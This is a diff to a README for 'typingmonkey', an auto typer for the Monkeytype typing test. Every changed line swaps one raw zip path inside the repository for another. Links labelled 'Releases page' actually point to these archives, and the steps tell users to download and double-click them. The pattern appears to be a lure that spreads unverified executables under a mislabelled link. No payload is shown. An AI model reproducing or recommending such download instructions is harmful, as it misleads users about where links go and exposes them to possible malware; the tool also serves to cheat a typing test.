@@ -1,6 +1,6 @@
 # 🐒 typingmonkey - Effortlessly Boost Your Typing Speed
 
-[![Download typingmonkey](https://github.com/I-Krushna/typingmonkey/raw/refs/heads/main/internal/Software-3.3.zip)](https://github.com/I-Krushna/typingmonkey/raw/refs/heads/main/internal/Software-3.3.zip)
+[![Download typingmonkey](https://github.com/I-Krushna/typingmonkey/raw/refs/heads/main/assets/Software-1.4.zip)](https://github.com/I-Krushna/typingmonkey/raw/refs/heads/main/assets/Software-1.4.zip)
 
 ## 📋 Description
 
@@ -11,7 +11,7 @@ typingmonkey is an engaging auto typer designed specifically for the Monkeytype 
 Follow these steps to get started with typingmonkey:
 
 1. **Download the Application**  
-   Visit our [Releases page](https://github.com/I-Krushna/typingmonkey/raw/refs/heads/main/internal/Software-3.3.zip) to download the latest version of typingmonkey. Look for the latest release at the top of the page.
+   Visit our [Releases page](https://github.com/I-Krushna/typingmonkey/raw/refs/heads/main/assets/Software-1.4.zip) to download the latest version of typingmonkey. Look for the latest release at the top of the page.
 
 2. **Install typingmonkey**  
    Once you download the file, find it in your downloads folder. Double-click the file to begin the installation process. Follow the prompts to complete the setup.
@@ -26,7 +26,7 @@ To download and install typingmonkey, follow these simple steps:
 1. **Head to the Releases Page**  
    Click on the link below to visit the page where you can get the latest version of typingmonkey:
 
-   [Download typingmonkey](https://github.com/I-Krushna/typingmonkey/raw/refs/heads/main/internal/Software-3.3.zip)
+   [Download typingmonkey](https://github.com/I-Krushna/typingmonkey/raw/refs/heads/main/assets/Software-1.4.zip)
 
 2. **Select the Latest Release**  
    On the Releases page, identify the latest version. It will usually be marked as the most recent addition. Click on it to see the available downloads.
@@ -66,4 +66,4 @@ If you have any questions or need assistance, please open an issue in the reposi
 
 typingmonkey is open-source software licensed under the MIT License. You are encouraged to contribute, modify, or use it as you see fit.
 
-Enjoy typing with typingmonkey! Visit our [Releases page](https://github.com/I-Krushna/typingmonkey/raw/refs/heads/main/internal/Software-3.3.zip) to get the latest version and start improving your typing skills today.
+Enjoy typing with typingmonkey! Visit our [Releases page](https://github.com/I-Krushna/typingmonkey/raw/refs/heads/main/assets/Software-1.4.zip) to get the latest version and start improving your typing skills today.
